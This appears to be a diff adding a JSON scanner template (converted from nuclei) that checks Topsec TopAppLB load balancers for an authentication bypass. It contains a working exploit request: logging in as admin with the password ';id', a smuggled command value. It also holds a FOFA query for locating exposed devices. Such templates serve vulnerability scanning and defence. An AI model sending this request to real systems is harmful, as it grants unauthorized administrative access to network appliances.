@@ -1,0 +1,122 @@
+{
+  "id": "topsec-topapplb-auth-bypass",
+  "name": "Topsec TopAppLB - Authentication Bypass",
+  "author": "SleepingBag945",
+  "severity": "HIGH",
+  "description": "Topsec TopAppLB is vulnerable to authetication bypass .Enter any account on the login page, the password is `;id`.\n",
+  "references": [
+    "https://github.com/cqr-cryeye-forks/goby-pocs/blob/main/Topsec-TopAppLB-Any-account-Login.json"
+  ],
+  "tags": [
+    "topsec",
+    "topapplb",
+    "auth-bypass"
+  ],
+  "protocol": "http",
+  "selfContained": false,
+  "searchQueries": {
+    "fofa": "title\u003d\"TopApp-LB 负载均衡系统\""
+  },
+  "variables": {},
+  "variablesType": "sniper",
+  "verifySteps": [
+    {
+      "stepId": "http_0",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "raw": [
+        "POST /login_check.php  HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nuserName\u003dadmin\u0026password\u003d%3Bid\n",
+        "GET / HTTP/1.1\nHost: {{Hostname}}\n"
+      ],
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "DSL",
+          "values": [
+            "status_code_1 \u003d\u003d 302 \u0026\u0026 status_code_2 \u003d\u003d 200",
+            "contains(body_2,\"var IsHeadMin \")",
+            "contains(header_1,\"redirect.php\") \u0026\u0026 !contains(tolower(header_1), \"error\u003d1\")"
+          ],
+          "negative": false,
+          "condition": "AND",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "OR",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    }
+  ],
+  "exploitSteps": [],
+  "globalConfig": {
+    "maxRetries": 0,
+    "retryInterval": 0,
+    "globalHeaders": {},
+    "stopAtFirstMatch": false,
+    "threads": 0,
+    "cookieReuse": false,
+    "dnsConfig": {},
+    "authConfig": {}
+  },
+  "originalPoc": {
+    "id": "topsec-topapplb-auth-bypass",
+    "info": {
+      "name": "Topsec TopAppLB - Authentication Bypass",
+      "author": "SleepingBag945",
+      "severity": "high",
+      "description": "Topsec TopAppLB is vulnerable to authetication bypass .Enter any account on the login page, the password is `;id`.\n",
+      "reference": [
+        "https://github.com/cqr-cryeye-forks/goby-pocs/blob/main/Topsec-TopAppLB-Any-account-Login.json"
+      ],
+      "metadata": {
+        "max_request": 2,
+        "fofa_query": "title\u003d\"TopApp-LB 负载均衡系统\""
+      },
+      "tags": "topsec,topapplb,auth-bypass"
+    },
+    "self_contained": false,
+    "http": [
+      {
+        "global_matchers": false,
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "redirects": false,
+        "skip_variables_check": false,
+        "stop_at_first_match": false,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "raw": [
+          "POST /login_check.php  HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nuserName\u003dadmin\u0026password\u003d%3Bid\n",
+          "GET / HTTP/1.1\nHost: {{Hostname}}\n"
+        ],
+        "matchers": [
+          {
+            "type": "dsl",
+            "dsl": [
+              "status_code_1 \u003d\u003d 302 \u0026\u0026 status_code_2 \u003d\u003d 200",
+              "contains(body_2,\"var IsHeadMin \")",
+              "contains(header_1,\"redirect.php\") \u0026\u0026 !contains(tolower(header_1), \"error\u003d1\")"
+            ],
+            "condition": "and"
+          }
+        ]
+      }
+    ]
+  },
+  "originalFormat": "nuclei"
+}
